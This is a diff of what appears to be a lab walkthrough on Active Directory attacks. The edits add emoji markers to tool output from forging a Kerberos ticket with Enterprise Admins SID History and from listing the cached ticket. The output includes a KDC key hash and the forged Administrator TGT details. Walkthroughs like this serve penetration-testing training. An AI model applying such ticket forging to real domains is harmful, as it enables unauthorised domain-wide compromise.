@@ -170,7 +170,7 @@ Let’s forge a ticket with SID History of Enterprise Admins. Run the below comm
 [*] ServiceKeyType : KERB_CHECKSUM_HMAC_MD5
 [*] KDCKey         : D7DDDEE831C334082DE7489882681B9C
 [*] KDCKeyType     : KERB_CHECKSUM_HMAC_MD5
-[*] Service        : krbtgt
+[*] Service        : krbtgt📌
 [*] Target         : DOLLARCORP.MONEYCORP.LOCAL
 
 [*] Generating EncTicketPart
@@ -178,7 +178,7 @@ Let’s forge a ticket with SID History of Enterprise Admins. Run the below comm
 [*] Encrypting EncTicketPart
 [*] Generating Ticket
 [*] Generated KERB-CRED
-[*] Forged a TGT for 'Administrator@dollarcorp.moneycorp.local'
+[*] Forged a TGT for 'Administrator🎭@dollarcorp.moneycorp.local'
 
 [*] AuthTime       : 2/17/2025 5:41:25 AM
 [*] StartTime      : 2/17/2025 5:41:25 AM
@@ -210,9 +210,9 @@ Copy the base64 encoded ticket from above and use it in the following command.
 [SNIP]
 
   ServiceName              :  http📌/mcorp-dc.MONEYCORP.LOCAL
-  ServiceRealm             :  MONEYCORP.LOCAL
+  ServiceRealm             :  MONEYCORP.LOCAL📌
   UserName                 :  Administrator🎭 (NT_PRINCIPAL)
-  UserRealm                :  DOLLARCORP.MONEYCORP.LOCAL
+  UserRealm                :  DOLLARCORP.MONEYCORP.LOCAL📌
   StartTime                :  2/17/2025 5:43:28 AM
   EndTime                  :  2/17/2025 3:41:25 PM
   RenewTill                :  2/24/2025 5:41:25 AM
@@ -227,8 +227,8 @@ Current LogonId is 0:0x38c010
 
 Cached Tickets: (1)
 
-#0>     Client: Administrator🎭 @ DOLLARCORP.MONEYCORP.LOCAL
-        Server: http📌/mcorp-dc.MONEYCORP.LOCAL @ MONEYCORP.LOCAL
+#0>     Client: Administrator🎭 @ DOLLARCORP.MONEYCORP.LOCAL📌
+        Server: http📌/mcorp-dc.MONEYCORP.LOCAL @ MONEYCORP.LOCAL📌
         KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
         Ticket Flags 0x40a50000 -> forwardable renewable pre_authent ok_as_delegate name_canonicalize
         Start Time: 2/17/2025 5:43:28 (local)
